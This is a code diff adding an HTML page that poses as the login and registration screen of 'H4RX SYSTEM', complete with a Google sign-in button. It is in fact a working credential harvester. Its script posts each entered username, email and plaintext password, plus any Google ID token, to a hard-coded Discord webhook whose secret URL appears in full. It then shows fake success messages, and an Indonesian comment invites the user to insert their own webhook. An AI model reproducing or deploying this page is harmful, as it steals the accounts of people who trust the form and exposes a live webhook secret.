@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>H4RX SYSTEM | LOGIN</title>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <style>
+        :root {
+            --primary-blue: #0055ff;
+            --dark-bg: #0a0a0c;
+            --accent-blue: #00d4ff;
+            --text-gray: #b0b0b0;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--dark-bg);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            overflow: hidden;
+        }
+
+        /* Background Glow */
+        .glow {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: var(--primary-blue);
+            filter: blur(150px);
+            border-radius: 50%;
+            z-index: -1;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .container {
+            background: rgba(15, 15, 20, 0.9);
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid rgba(0, 85, 255, 0.3);
+            width: 350px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        h2 { margin-bottom: 25px; color: var(--accent-blue); letter-spacing: 2px; }
+
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { display: block; font-size: 12px; margin-bottom: 5px; color: var(--text-gray); }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #15151b;
+            border: 1px solid #25252b;
+            border-radius: 5px;
+            color: white;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+        .input-group input:focus { border-color: var(--primary-blue); outline: none; }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary-blue);
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #0044cc; box-shadow: 0 0 15px var(--primary-blue); }
+
+        .divider { margin: 20px 0; font-size: 12px; color: #555; position: relative; }
+        .divider::before, .divider::after { content: ""; position: absolute; top: 50%; width: 40%; height: 1px; background: #333; }
+        .divider::before { left: 0; } .divider::after { right: 0; }
+
+        .google-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            color: #444;
+            padding: 10px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .toggle-link { margin-top: 20px; font-size: 13px; color: var(--text-gray); }
+        .toggle-link span { color: var(--accent-blue); cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="glow"></div>
+
+    <div class="container" id="authBox">
+        <h2 id="formTitle">LOGIN ♈</h2>
+        
+        <div id="registerFields" style="display: none;">
+            <div class="input-group">
+                <label>USERNAME</label>
+                <input type="text" id="regUser" placeholder="AfriezzaXyzter">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>EMAIL / ADDRESS</label>
+            <input type="email" id="email" placeholder="example@gmail.com">
+        </div>
+        <div class="input-group">
+            <label>PASSWORD</label>
+            <input type="password" id="password" placeholder="••••••••">
+        </div>
+
+        <button class="btn" id="mainBtn" onclick="submitData()">LOGIN</button>
+
+        <div class="divider">OR</div>
+
+        <div id="g_id_onload"
+             data-client_id="YOUR_GOOGLE_CLIENT_ID"
+             data-callback="handleCredentialResponse">
+        </div>
+        <div class="g_id_signin" data-type="standard"></div>
+
+        <div class="toggle-link" id="toggleText">
+            Don't have an account? <span onclick="toggleMode()">Register</span>
+        </div>
+    </div>
+
+    <script>
+        let isRegister = false;
+        // GANTI URL DI BAWAH DENGAN WEBHOOK DISCORD LO, BOS!
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1401926758214668308/ijmJNNlQcGPt68nJc15nUyZC9t3jt4utAAmVQsAPJwVmYGVXw7q8VgOnziesgcMUC16Q";
+
+        function toggleMode() {
+            isRegister = !isRegister;
+            document.getElementById('formTitle').innerText = isRegister ? 'REGISTER ♈' : 'LOGIN ♈';
+            document.getElementById('registerFields').style.display = isRegister ? 'block' : 'none';
+            document.getElementById('mainBtn').innerText = isRegister ? 'CREATE ACCOUNT' : 'LOGIN';
+            document.getElementById('toggleText').innerHTML = isRegister ? 
+                'Already have an account? <span onclick="toggleMode()">Login</span>' : 
+                'Don\'t have an account? <span onclick="toggleMode()">Register</span>';
+        }
+
+        async function submitData() {
+            const user = document.getElementById('regUser').value || "Existing User";
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if(!email || !pass) return alert("Isi semua data, Bos!");
+
+            // Kirim ke Webhook Discord
+            const payload = {
+                username: "H4RX SYSTEM LOGGER",
+                embeds: [{
+                    title: isRegister ? "NEW REGISTERED DATA" : "USER ATTEMPT LOGIN",
+                    color: isRegister ? 65280 : 255, // Hijau untuk reg, Biru untuk login
+                    fields: [
+                        { name: "Username", value: user, inline: true },
+                        { name: "Email", value: email, inline: true },
+                        { name: "Password", value: "`" + pass + "`", inline: false },
+                        { name: "Action", value: isRegister ? "Registration" : "Login", inline: true }
+                    ],
+                    footer: { text: "AfriezzaXyzter ♈ | " + new Date().toLocaleString() }
+                }]
+            };
+
+            await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            alert(isRegister ? "Registration Success!" : "Login Processed!");
+        }
+
+        // Handle Google Login
+        function handleCredentialResponse(response) {
+            const payload = {
+                username: "H4RX SYSTEM LOGGER",
+                content: "🔵 **USER LOGGED IN VIA GOOGLE**\nToken: `" + response.credential + "`"
+            };
+            fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            alert("Google Login Success!");
+        }
+    </script>
+</body>
+</html>
